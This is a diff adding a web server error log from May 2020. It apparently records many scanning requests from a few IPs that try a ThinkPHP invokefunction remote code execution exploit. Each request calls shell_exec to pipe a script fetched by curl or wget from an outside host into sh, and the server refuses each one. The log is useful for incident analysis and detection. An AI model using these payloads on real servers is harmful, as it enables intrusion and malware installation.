@@ -1,0 +1,90 @@
+---------------------------------------------------------------
+[ 2020-05-16T00:43:25+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T00:43:26+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T01:19:32+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T01:19:34+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T02:10:00+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T02:10:02+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T05:16:35+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T05:16:37+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T06:36:13+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T06:36:15+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T09:34:23+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T09:34:24+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T10:17:36+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T10:17:38+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T13:34:26+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T13:34:27+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T14:23:08+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T14:23:09+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T15:22:55+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T15:22:58+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T16:25:27+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T16:25:28+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T17:44:15+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T17:44:16+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T20:26:53+08:00 ] 95.215.108.217 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T20:26:54+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T21:18:46+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T21:18:47+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T23:29:03+08:00 ] 212.8.247.179 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
+---------------------------------------------------------------
+[ 2020-05-16T23:29:06+08:00 ] 95.214.11.231 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%2051.83.171.41/t.sh|sh
+[ error ] [2]shell_exec() has been disabled for security reasons
